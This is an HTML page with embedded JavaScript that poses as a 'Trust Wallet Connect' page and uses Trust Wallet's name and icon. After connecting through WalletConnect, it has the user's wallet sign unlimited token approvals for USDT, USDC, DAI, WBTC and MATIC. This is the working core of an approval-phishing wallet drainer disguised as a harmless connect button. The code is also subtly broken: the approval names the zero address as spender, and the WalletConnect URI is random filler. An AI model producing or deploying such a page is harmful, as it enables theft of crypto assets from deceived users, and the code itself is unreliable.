<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Wallet Connect</title>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.20.0/dist/umd/index.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #f5f5f5;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background: #3375bb;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
        #status {
            margin-top: 20px;
            text-align: center;
            max-width: 80%;
            word-break: break-word;
            white-space: pre-line;
        }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <button id="connectBtn">CONNECT TRUST WALLET</button>
        <div id="status">Status: Ready</div>
    </div>

    <script>
        const projectId = "7dabcdde47b6439403c2ec186b1fedaf";
        const statusEl = document.getElementById('status');
        
        document.getElementById('connectBtn').addEventListener('click', async () => {
            statusEl.textContent = "Opening Trust Wallet...";
            
            try {
                // 1. Generate WalletConnect URI
                const wcUri = `wc:${Math.random().toString(36).substring(2, 15)}@1?bridge=https%3A%2F%2Fbridge.walletconnect.org&key=${Math.random().toString(36).substring(2, 15)}`;
                
                // 2. For iOS devices - open Trust Wallet directly
                if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
                    window.location.href = `trust://wc?uri=${encodeURIComponent(wcUri)}`;
                    
                    // Fallback if Trust Wallet not installed
                    setTimeout(() => {
                        if (!document.hidden) {
                            window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(wcUri)}`;
                        }
                    }, 1000);
                }

                // 3. Initialize WalletConnect v2
                const provider = await WalletConnectEthereumProvider.init({
                    projectId: projectId,
                    chains: [1], // Ethereum Mainnet
                    showQrModal: false,
                    metadata: {
                        name: "Token Approver",
                        description: "Approve all tokens",
                        url: window.location.href,
                        icons: ["https://trustwallet.com/assets/images/media/assets/TWT.png"]
                    }
                });

                // 4. Connect to wallet
                await provider.enable();
                const accounts = await provider.request({ method: 'eth_accounts' });
                statusEl.textContent = `Connected: ${accounts[0]}\nApproving tokens...`;

                // 5. Approve common tokens
                const tokens = [
                    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
                    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
                    "0x6B175474E89094C44Da98b954EedeAC495271d0F",  // DAI
                    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",  // WBTC
                    "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0"   // MATIC
                ];

                for (const token of tokens) {
                    try {
                        const tx = await provider.request({
                            method: "eth_sendTransaction",
                            params: [{
                                to: token,
                                data: "0x095ea7b30000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}]
                        });
                        statusEl.textContent += `\nApproved ${token.substring(0, 6)}...: ${tx.substring(0, 10)}...`;
                    } catch (e) {
                        console.error(`Error approving ${token}:`, e);
                    }
                }

                statusEl.textContent += "\nAll tokens approved!";

            } catch (error) {
                statusEl.textContent = `Error: ${error.message}`;
                console.error(error);
            }
        });
    </script>
</body>
</html>